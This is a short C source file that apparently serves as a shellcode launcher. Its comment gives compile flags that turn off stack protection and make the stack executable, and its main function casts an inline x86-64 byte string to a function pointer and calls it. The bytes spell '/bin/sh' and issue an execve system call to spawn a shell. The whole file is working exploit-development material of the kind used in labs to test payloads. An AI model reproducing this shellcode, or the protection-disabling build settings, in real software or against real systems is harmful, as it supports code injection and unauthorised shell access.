//Compile with: gcc -fno-stack-protector -z execstack -o launcher launcher.c


int main()
{
    char shellcode[] = "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05";
    int (*func)();
    func = (int (*)()) shellcode;
    (int)(*func)();
     return 0;
}
            